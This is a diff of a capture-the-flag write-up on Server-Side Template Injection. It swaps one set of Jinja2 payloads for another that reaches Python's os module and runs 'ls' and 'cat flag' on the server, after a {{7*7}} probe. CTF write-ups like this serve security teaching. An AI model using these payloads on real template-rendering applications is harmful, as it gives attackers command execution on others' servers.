@@ -27,15 +27,15 @@ The application was vulnerable to Server-Side Template Injection (SSTI) in an in
 ---
 
 ## 🧠 Step-by-Step Solution
-1. Tested:
-{{7*7}}
-
+1. Tested:  
+{{7*7}}  
 Response: `49` → SSTI confirmed.
-2. Directory listing:
-{{request.application.globals.builtins.import('os').popen('ls -R').read()}}
 
-3. Retrieved flag:
-{{request.application.globals.builtins.import('os').popen('cat flag').read()}}
+2. Directory listing:  
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}
+
+3. Retrieved flag:  
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}
 
 ---
 
